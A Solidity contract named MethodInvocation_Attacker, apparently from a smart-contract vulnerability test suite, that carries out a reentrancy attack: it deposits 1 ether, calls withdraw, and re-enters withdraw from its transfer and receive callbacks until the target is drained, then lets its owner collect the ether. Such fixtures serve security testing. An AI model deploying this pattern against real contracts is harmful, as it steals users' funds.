// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../interfaces/single-function/IMethodInvocation.sol";

contract MethodInvocation_Attacker is IMethodCallee {
    IMethodInvocation public c;
    address public owner;

    constructor(address _c) {
        c = IMethodInvocation(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.withdraw(address(this));
    }

    function transfer() external payable returns (bool) {
        // Reenter withdraw if contract balance is sufficient
        if (address(c).balance >= 1 ether) {
            c.withdraw(address(this));
        }
        return true;
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw(address(this));
        }
    }
}
